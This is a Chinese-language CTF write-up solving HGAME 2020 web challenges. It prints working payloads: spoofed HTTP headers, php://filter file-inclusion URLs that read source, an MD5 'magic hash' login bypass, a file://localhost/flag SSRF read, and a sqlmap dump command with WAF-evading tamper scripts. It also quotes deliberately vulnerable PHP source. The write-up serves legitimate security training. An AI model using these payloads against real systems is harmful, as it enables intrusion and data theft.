---
title: HGAME 2020_Web
date:  2020-01-17
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210228093852.png
description: Vidar team主办的比赛
categories: 
- ctf_writeup
tags:

---
hgame2020是我第一次参加的个人赛；

官方wp：https://github.com/vidar-team/Hgame2020_writeup

byc_404师傅的wp：https://www.jianshu.com/p/5bb6ecd67293

### level-week 1

------

#### web2_接头霸王

这道题起初没有明白接头霸王是什么意思，后来做完之后才发现这个“头”指的是HTTP请求头；（灰兔子脸

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120164937.png)

走流程，抓包：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165020.png)

"You need to come from https://vidar.club"，也就是修改http头里面的referer：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165048.png)

继续看："You need to visit it locally",显然是XFF头：

```
x-forwarded-for: 127.0.0.1
```

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165108.png)

"the flag will be update after 2077,please wait for patiently",显然不可能等到2077年，于是修改：

```
if-unmodified-since: Wed, 21 Oct 2077 07:28:00 GMT
```

(只要是2077年之后都行)

- HTTP协议中的 **If-Unmodified-Since** 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 [POST](https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FMethods%2FPOST) 或其他 non-[safe](https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FGlossary%2Fsafe) 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 [412](https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FStatus%2F412) (Precondition Failed) 错误。

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165116.png)

拿到flag；

 

#### web3_codewolrd

点进去是一个403页面，f12，看源码，发现`<script>`里面有一行提示：

This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!

应该是302跳转；

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165139.png)

- 当我们用浏览器去访问时，浏览器会自动重定向到指定的页面，而此页面并不是我们想要的含有flag的页面，通过抓包可以看到页面被重定向。因此，我们应该想办法让页面不重定向，这样就可以拿到flag了

于是，我就想到了 ***curl*** 这个命令，该命令只有在加参数 -L 的情况下才会重定向。

Windows下curl的安装以及解决中文乱码：https://segmentfault.com/a/1190000015115481

iconv是另一个工具，iconv -f utf-8 -t gbk是解决乱码：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165149.png)

继续试：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165154.png)

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165200.png)

看到显示的人鸡验证，知道肯定有东西（滑稽，然后这里卡了一下午，知道第二天看到题目描述才懂：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165206.png)

然后是明白url里面+号需要编码：+  ——>  %2b  ；直接用+号表示空格；

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165211.png)

使用burp suite同样可以做，只不过要抓跳转之前的包：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165305.png)

拿到flag；

 

#### web4_ji你太玫

本题没有发现什么正常思路（可能是我太菜了）点进去一个页面，叫你玩游戏：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165345.png)

游戏不难，通关之后，没有任何反应，所以重开故意死一次：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165400.png)

3w分是不可能的，因为就算不死，每一关分数清零；然后就去burp里面看，找到一个比较可疑的history（因为是POST）：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165410.png)

点进去，http请求体里面有个键名叫score，恍然大悟：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165420.png)

flag入手；

week1题目结束；

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165427.png)





### level-week 2

------

 

#### web1_Cosmos的博客后台

点开题目：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165432.png)

在burpsuite里面可以看到两个包，一个是从index.php重定向过来的，一个是login.php；

由参数 'action=' 联想到文件包含漏洞（文件包含漏洞学习笔记），于是尝试使用几个PHP伪协议来读取页面的源码；

这里附上几个协议的用法：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165442.jpeg)

playload：

```
http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=index.php
http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php
```

可以得到两个页面的（base64加密过后的）源码；

login.php:

```
<?php
include "config.php";
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET['debug'])) {
        $debug = $_GET['debug'];
        if (!preg_match("/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/", $debug)) {     
            die("args error!");
        }
        eval("var_dump($$debug);");
    }
}

if(isset($_SESSION['username'])) {
    header("Location: admin.php");
    exit();
}
else {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){
            $_SESSION['username'] = $_POST['username'];
            header("Location: admin.php");
            exit();
        }
        else {
            echo "用户名或密码错误";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Cosmos的博客后台</title>
    <link href="static/signin.css" rel="stylesheet">
    <link href="static/sticky-footer.css" rel="stylesheet">
    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>

<div class="container">
    <form class="form-signin" method="post" action="login.php">
        <h2 class="form-signin-heading">后台登陆</h2>
        <input type="text" name="username" class="form-control" placeholder="用户名" required autofocus>
        <input type="password" name="password" class="form-control" placeholder="密码" required>
        <input class="btn btn-lg btn-primary btn-block" type="submit" value="Submit">
    </form>
</div>
<footer class="footer">
	<center>
	<div class="container">
        <p class="text-muted">Created by Annevi</p>
      </div>
      </center>
</footer>
</body>
</html>
```

index.php:

```
<?php
error_reporting(0);
session_start();

if(isset($_SESSION['username'])) {
    header("Location: admin.php");
    exit();
}

$action = @$_GET['action'];
$filter = "/config|etc|flag/i";

if (isset($_GET['action']) && !empty($_GET['action'])) {
    if(preg_match($filter, $_GET['action'])) {
        echo "Hacker get out!";
        exit();
    }
    include $action;
}
elseif(!isset($_GET['action']) || empty($_GET['action'])) {
    header("Location: ?action=login.php");
    exit();
}
```

过滤了flag关键字，看来不能直接文件包含读flag

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165457.png)

继续看，login.php里面的debug：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165502.png)

（PHP中的魔术变量）意思是GET过去的debug等于什么名字就输出什么名字的变量

就很nice：

```
http://cosmos-admin.hgame.day-day.work/login.php?action=login.php&debug=admin_username
http://cosmos-admin.hgame.day-day.work/login.php?action=login.php&debug=admin_password
```

可以分别得到：

用户名：Cosmos!

密码：（md5加密后）0e114902927253523756713132279690

然后密码又是弱类型判断（[常见MD5碰撞的playload](https://www.cnblogs.com/Jie-Fei/p/9886598.html)）；

于是输入密码 ：

```
QNKCDZO
```

登录成功：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165508.png)

看样子只有插入图片的地方能搞事；

XSS不能读取服务器文件，那就[SSRF](https://blog.csdn.net/fageweiketang/article/details/88983921)：

```
file:///flag
```

试一下，不行；

文件包含读取admin.php:

```
http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=admin.php
```

admin.php:

```
<?php
include "config.php";
session_start();
if(!isset($_SESSION['username'])) {
    header('Location: index.php');
    exit();
}

function insert_img() {
    if (isset($_POST['img_url'])) {
        $img_url = @$_POST['img_url'];
        $url_array = parse_url($img_url);
        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents("static/logo.png"));
    }
}
?>

<html>
    <head>
        <title>Cosmos’ Blog - 后台管理</title>
    </head>
    <body>
        <a href="logout.php">退出登陆</a>
        <div style="text-align: center;">
            <h1>Welcome <?php echo $_SESSION['username'];?> </h1>
        </div>
        <form action="" method="post">
            <fieldset style="width: 30%;height: 20%;float:left">
                <legend>插入图片</legend>
                <p><label>图片url: <input type="text" name="img_url" placeholder=""></label></p>
                <p><button type="submit" name="submit">插入</button></p>
            </fieldset>
        </form>
        <fieldset style="width: 30%;height: 20%;float:left">
                <legend>评论管理</legend>
                <h2>待开发..</h2>
        </fieldset>
        <fieldset style="width: 30%;height: 20%;">
                <legend>文章列表</legend>
                <h2>待开发..</h2>
        </fieldset>
        <fieldset style="height: 50%">
            <div style="text-align: center;">
                <img height='200' width='500' src='data:image/jpeg;base64,<?php echo insert_img() ? insert_img() : base64_encode(file_get_contents("static/error.jpg")); ?>'>
            </div>
        </fieldset>
    </body>
</html>
```

看到有一个过滤:

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165525.png)

于是：

```
file://localhost/flag
```

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165535.png)

```
aGdhbWV7cEhwXzFzX1RoM19CM3NUX0w0bkd1NGdFIUAhfQo=
```

base64解码：

hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}

 

 

#### Cosmos的留言板

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120165546.png)

最开始没有发现什么思路，后来是用kali下的sqlmap扫了出来，这里要用到sqlmap的tamper

这里就直接上playload:

```
sqlmap -u "http://139.199.182.61/index.php?id=1" -D easysql -T f1aggggggggggggg -C fl4444444g --dump --tamper "randomcase.py,space2comment.py"
```

hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}